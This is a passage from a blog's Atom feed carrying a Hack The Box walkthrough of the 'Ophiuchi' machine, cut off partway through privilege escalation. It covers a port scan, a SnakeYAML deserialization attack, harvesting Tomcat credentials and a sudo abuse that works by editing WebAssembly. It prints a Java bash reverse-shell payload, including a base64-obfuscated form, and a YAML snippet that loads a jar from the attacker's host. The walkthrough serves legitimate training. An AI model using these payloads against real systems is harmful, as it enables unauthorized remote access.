<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-07-16T21:39:33+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Ryan Kozak</title><subtitle>hacking, web development, $other</subtitle><author><name>Ryan Kozak</name></author><entry><title type="html">Hack The Box - Ophiuchi</title><link href="http://0.0.0.0:4000/hack-the-box-craft-ophiuchi/" rel="alternate" type="text/html" title="Hack The Box - Ophiuchi" /><published>2021-07-16T00:00:00+00:00</published><updated>2021-07-16T21:39:29+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-ophiuchi</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-craft-ophiuchi/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/badge.png&quot; alt=&quot;badge&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Ophiuchi is a Medium box with a weird name to pronounce. The initial foothold was straight forward but fun, the user flag reminds us to go back to the basics, and the root flag is a difficult mind game for those of us that haven’t even been exposed to the technology.&lt;/p&gt;

&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
&lt;h2 id=&quot;port-scan-nmapautomator&quot;&gt;Port Scan: nmapAutomator&lt;/h2&gt;
&lt;p&gt;We begin our reconnaissance by running &lt;em&gt;&lt;a href=&quot;https://github.com/21y4d/nmapAutomator&quot;&gt;nmapAutomator&lt;/a&gt;&lt;/em&gt; via &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo ./nmapAutomator.sh 10.10.10.227 All&lt;/code&gt;. Among many other things, this runs our port scans with increasing comprehensiveness.&lt;/p&gt;

&lt;p&gt;Output of Basic nmap scan below.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Tools/nmapAutomator/10.10.10.227/nmap]
└─$ cat Basic_10.10.10.227.nmap
# Nmap 7.91 scan initiated Fri Jun 11 19:18:21 2021 as: nmap -Pn -sCV -p22,8080 -oN nmap/Basic_10.10.10.227.nmap --dns-server=1.1.1.1 10.10.10.227
Nmap scan report for 10.10.10.227
Host is up (0.34s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 11 19:18:49 2021 -- 1 IP address (1 host up) scanned in 27.15 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The open ports on the machine are &lt;strong&gt;22&lt;/strong&gt; and &lt;strong&gt;8080&lt;/strong&gt;. These are all we’ll need to proceed through the rest of the box. Let’s take a look at what’s on the web port.&lt;/p&gt;

&lt;h3 id=&quot;port-8080&quot;&gt;Port 8080&lt;/h3&gt;
&lt;p&gt;Browsing to the website we can see that it’s a web application for parsing YAML.&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/parser.png&quot; alt=&quot;yaml_webapp&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 1:&lt;/strong&gt; Online YAML parser&lt;/p&gt;

&lt;p&gt;A quick search for “YAML parser vulnerability” leads us to “Snake YAML Deserilization” &lt;em&gt;&lt;a href=&quot;https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858&quot;&gt;1&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/yaml_google.png&quot; alt=&quot;yaml_google&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 2:&lt;/strong&gt; Snake YAML Deserilization Exploit.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial foothold&lt;/h2&gt;
&lt;p&gt;The SnakeYAML deserilization attack is made easier with artsploit’s &lt;em&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;yaml-payload Github repository&lt;/a&gt;&lt;/em&gt; and an additional payload for a reverse shell can be found in &lt;em&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload/issues/3&quot;&gt;issue 3&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;First, we’ll clone the repository &lt;code class=&quot;highlighter-rouge&quot;&gt;git clone https://github.com/artsploit/yaml-payload.git&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/clone.png&quot; alt=&quot;clone_repo&quot; /&gt;
&lt;strong&gt;Figure 3:&lt;/strong&gt; Clone yaml-payload repo.&lt;/p&gt;

&lt;p&gt;We then navigate to &lt;code class=&quot;highlighter-rouge&quot;&gt;yaml-payload/src/artsploit&lt;/code&gt; and modify the &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory()&lt;/code&gt; method within &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory.java&lt;/code&gt;. The default payload pops open the calculator application on MacOS. The payloads that are posted in &lt;em&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload/issues/3&quot;&gt;issue 3&lt;/a&gt;&lt;/em&gt; of this repo will call a reverse shell, so rather than recreating them, we’ll drop the first payload into &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory.java&lt;/code&gt; with our IP address as the callback.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AwesomeScriptEngineFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.3/8081 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo $jex&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/awesome_jar.png&quot; alt=&quot;awesome_jar&quot; /&gt;
&lt;strong&gt;Figure 4:&lt;/strong&gt; Placing reverse shell payload into &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory.java&lt;/code&gt;’s &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory()&lt;/code&gt; method.&lt;/p&gt;

&lt;p&gt;Now, as instructed by the repository, we’ll compile the &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory.java&lt;/code&gt; file and build our &lt;code class=&quot;highlighter-rouge&quot;&gt;yaml-payload.jar&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/build.png&quot; alt=&quot;build&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 5:&lt;/strong&gt; Compiling Java exploit and building &lt;code class=&quot;highlighter-rouge&quot;&gt;yaml-payload.jar&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Since the snippet we’ll be placing into the web application will pull &lt;code class=&quot;highlighter-rouge&quot;&gt;yaml-payload.jar&lt;/code&gt; from a remote url, we’ll copy the payload to our apache directory and make sure the server is running.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/copy_server.png&quot; alt=&quot;copy_server&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 6:&lt;/strong&gt; Copy &lt;code class=&quot;highlighter-rouge&quot;&gt;yaml-payload.jar&lt;/code&gt; to Apache’s directory and start the server.&lt;/p&gt;

&lt;p&gt;By placing the snippet below into the YAML parser, we’ll download the payload we’ve just created and hosted, and execute it  on the victim machine (we must first not forget to start our netcat listener on port 8081)&lt;/p&gt;
&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;javax&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ScriptEngineManager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;URLClassLoader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.14.3/yaml-payload.jar&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/execute_foothold.png&quot; alt=&quot;execute_foothold&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 7:&lt;/strong&gt; Snippet placed in web application.&lt;/p&gt;

&lt;p&gt;Once we click “parse” the payload is executed and our shell is obtained.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/foothold.png&quot; alt=&quot;foothold&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 8:&lt;/strong&gt; Reverse shell as tomcat user.&lt;/p&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;
&lt;p&gt;Moving from the initial foothold to the user flag on this machine is fairly simple. After some manual enumeration we’ll find that &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/tomcat/conf/tomcat-users.xml&lt;/code&gt; contains a password &lt;code class=&quot;highlighter-rouge&quot;&gt;whereisalimit&lt;/code&gt; for the &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/users_xml.png&quot; alt=&quot;users_xml&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 9:&lt;/strong&gt; The &lt;code class=&quot;highlighter-rouge&quot;&gt;tomcat-users.xml&lt;/code&gt; file containing credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; user.&lt;/p&gt;

&lt;p&gt;To login as the &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; user, we’ll first use the old &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt; trick to get an interactive shell, and then simply &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; with the credentials we’ve found.&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/user.png&quot; alt=&quot;users&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 10:&lt;/strong&gt; The flag for the &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; user.&lt;/p&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
&lt;p&gt;Running &lt;em&gt;&lt;a href=&quot;https://github.com/diego-treitos/linux-smart-enumeration&quot;&gt;lse.sh&lt;/a&gt;&lt;/em&gt; reveals that we’re able to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/wasm-functions/index.go&lt;/code&gt; via sudo without a password.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
---
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When we examine the &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/wasm-functions/index.go&lt;/code&gt; file, we can see that it reads &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; without a path, and calls &lt;code class=&quot;highlighter-rouge&quot;&gt;deploy.sh&lt;/code&gt; without a path. If a variable &lt;code class=&quot;highlighter-rouge&quot;&gt;f&lt;/code&gt; is set equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;wasm&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;github.com/wasmerio/wasmer-go/wasmer&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;os/exec&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;log&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wasm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;main.wasm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wasm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NewInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;info&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Not ready to deploy&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Ready to deploy&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;deploy.sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fatal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we’re able to control this &lt;code class=&quot;highlighter-rouge&quot;&gt;f&lt;/code&gt; variable, then we can create our own &lt;code class=&quot;highlighter-rouge&quot;&gt;deploy.sh&lt;/code&gt; script to be executed in another directory (presumable to gain us a reverse shell as root).&lt;/p&gt;

&lt;p&gt;To decompile &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; into a human readable &lt;code class=&quot;highlighter-rouge&quot;&gt;.wat&lt;/code&gt; file, we can use the following &lt;em&gt;&lt;a href=&quot;https://github.com/WebAssembly/wabt.git&quot;&gt;https://github.com/WebAssembly/wabt.git&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Tools]
└─$ git clone https://github.com/WebAssembly/wabt.git            
Cloning into 'wabt'...
remote: Enumerating objects: 29666, done.
remote: Counting objects: 100% (93/93), done.
remote: Compressing objects: 100% (72/72), done.
remote: Total 29666 (delta 37), reused 35 (delta 21), pack-reused 29573
Receiving objects: 100% (29666/29666), 20.83 MiB | 269.00 KiB/s, done.
Resolving deltas: 100% (23736/23736), done.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since we’ve got the credentials to the &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; user, it’s convenient enough to just &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt;  &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; to our local machine to decompile. Once we’ve done so &lt;code class=&quot;highlighter-rouge&quot;&gt;~/Tools/wabt/bin/wasm2wat ~/main.wasm &amp;gt; ~/main.wat&lt;/code&gt; yeilds the following web assembly code.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-WebAssembly&quot;&gt;(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export &quot;memory&quot; (memory 0))
  (export &quot;info&quot; (func $info))
  (export &quot;__data_end&quot; (global 1))
  (export &quot;__heap_base&quot; (global 2)))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After more trial and error than I’d care to admit, it is determined that all we’ve got to do is change &lt;code class=&quot;highlighter-rouge&quot;&gt;i32.const&lt;/code&gt; to be &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, and the file becomes.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-WebAssembly&quot;&gt;(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 1)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export &quot;memory&quot; (memory 0))
  (export &quot;info&quot; (func $info))
